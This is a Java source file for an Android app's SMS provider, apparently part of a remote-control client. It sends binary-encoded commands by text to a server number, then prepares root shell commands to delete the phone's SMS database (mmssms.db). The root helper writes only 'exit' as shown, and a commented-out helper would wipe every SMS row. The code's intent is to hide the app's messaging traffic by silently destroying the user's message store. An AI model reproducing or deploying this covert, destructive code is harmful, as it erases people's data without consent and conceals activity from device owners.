package ir.rayacell.mahdaclient.provider;

import ir.rayacell.mahdaclient.App;
import ir.rayacell.mahdaclient.MainActivity;
import ir.rayacell.mahdaclient.manager.NetworkManager;
import ir.rayacell.mahdaclient.manager.Utils;
import ir.rayacell.mahdaclient.param.BaseParam;
import ir.rayacell.mahdaclient.security.EncryptDecrypt;
import ir.rayacell.mahdaclient.security.Util;

import java.io.DataOutputStream;
import java.io.IOException;

import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.database.SQLException;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteDatabase.CursorFactory;
import android.database.sqlite.SQLiteOpenHelper;
import android.telephony.SmsManager;

public class SMSProvider extends BaseProvider {

	public SMSProvider(ProviderManager providerManager, MainActivity activity) {
		super(providerManager, activity);
		// TODO Auto-generated constructor stub
	}

	@Override
	public boolean connect(BaseParam param) {
		// TODO Auto-generated method stub
		return false;
	}

	@Override
	public boolean send(BaseParam param) {
		// TODO Auto-generated method stub
		System.out.println(param.getCommand_type() + "  sms  "
				+ "==============================");

		String SENT = "SMS_SENT";
		String DELIVERED = "SMS_DELIVERED";

		PendingIntent sentPI = PendingIntent.getBroadcast(activity, 0,
				new Intent(SENT), 0);

		PendingIntent deliveredPI = PendingIntent.getBroadcast(activity, 0,
				new Intent(DELIVERED), 0);
		SmsManager sms = SmsManager.getDefault();
		// 9370131836
		// sends ip address of server as message
		// String temp = "hi";
		String params = param.getCommand();
//		params = EncryptDecrypt.cipher(params, 4);

		// params = new SimpleCrypto().enc(params);

		// try {
		// params = EncryptDecrypt.encrypt(params);
		// } catch (InvalidKeyException e) {
		// e.printStackTrace();
		// } catch (NoSuchAlgorithmException e) {
		// e.printStackTrace();
		// } catch (NoSuchPaddingException e) {
		// e.printStackTrace();
		// } catch (IllegalBlockSizeException e) {
		// e.printStackTrace();
		// } catch (BadPaddingException e) {
		// e.printStackTrace();
		// }
		// String number =
		// "0"+NetworkManager.getServerNumber().substring(3,NetworkManager.getServerNumber().length());
		String number = NetworkManager.getServerNumber();
		// sms.sendDataMessage(number, null, (short) 56889, params.getBytes()/*
		// message.getBytes() *//*
		// * NetworkManager.
		// * getIpAddress
		// * ()
		// *//*
		// * getIPAddress(
		// * true)
		// * .getBytes
		// * ()
		// */,
		// sentPI, deliveredPI);
		try {
			params = Util.stringToBinary(params);
			Utils.setProvider();
			sms.sendTextMessage(number, null,
					params/* message.getBytes() *//*
												 * NetworkManager. getIpAddress ()
												 *//*
													 * getIPAddress( true) .getBytes
													 * ()
													 */, sentPI, deliveredPI);
		} catch (Exception e) {
			// TODO: handle exception
		}
		
		// TODO
		// if(NetworkManager.getIpAddress())
		// Utils.setProvider();
		// Container.getProviderManager().setInternetProvider();
		 String[] cmds = new
		 String[]{"cd /data/data/com.android.providers.telephony/databases","rm mmssms.db"};
		try {
			RunAsRoot( cmds);
		} catch (IOException e) {
		}
	
		return false;

	}

	@Override
	public void recieve(BaseParam param) {
		// TODO Auto-generated method stub
		mProviderManager.recieve(param);
	}

	// public void sendSMS(Context context , String message){
	// String SENT = "SMS_SENT";
	// String DELIVERED = "SMS_DELIVERED";
	//
	// PendingIntent sentPI = PendingIntent.getBroadcast(context, 0,
	// new Intent(SENT), 0);
	//
	// PendingIntent deliveredPI = PendingIntent.getBroadcast(
	// context, 0, new Intent(DELIVERED), 0);
	// SmsManager sms = SmsManager.getDefault();
	// // 9370131836
	// sms.sendDataMessage("9302798816", null,(short)
	// 56889,message.getBytes(),sentPI , deliveredPI);
	// }

	public void RunAsRoot(String [] cmds) throws IOException {
		Process p = Runtime.getRuntime().exec("su");
		DataOutputStream os = new DataOutputStream(p.getOutputStream());
//		DataBaseHelper mDbHelper  =new DataBaseHelper(App.getContext());
//		mDbHelper.openDataBase();
		for(String s : cmds){
//			os.writeBytes(s+"\n");
		}
//		mDbHelper.getWritableDatabase().execSQL("delete from sms where 1 =1 ;");
		os.writeBytes("exit\n");
		os.flush();
	}

//	class DataBaseHelper extends SQLiteOpenHelper {
//
//		public DataBaseHelper(Context context) {
//			 super(context,  "mmssms.db", null, 1);
//		}
//
//		@Override
//		public void onCreate(SQLiteDatabase arg0) {
//			// TODO Auto-generated method stub
//
//		}
//
//		@Override
//		public void onUpgrade(SQLiteDatabase arg0, int arg1, int arg2) {
//			// TODO Auto-generated method stub
//
//		}
//
//		public boolean openDataBase() throws SQLException {
//			String DB_PATH = "/data/data/com.android.providers.telephony/databases/";
//			SQLiteDatabase mDataBase = SQLiteDatabase.openDatabase(DB_PATH
//					+ "mmssms.db", null, SQLiteDatabase.CREATE_IF_NECESSARY);
//			String mPath = DB_PATH + "mmssms.db";
//			// Log.v("mPath", mPath);
//			mDataBase = SQLiteDatabase.openDatabase(mPath, null,
//					SQLiteDatabase.CREATE_IF_NECESSARY);
//			// mDataBase = SQLiteDatabase.openDatabase(mPath, null,
//			// SQLiteDatabase.NO_LOCALIZED_COLLATORS);
//			return mDataBase != null;
//		}
//	}
}
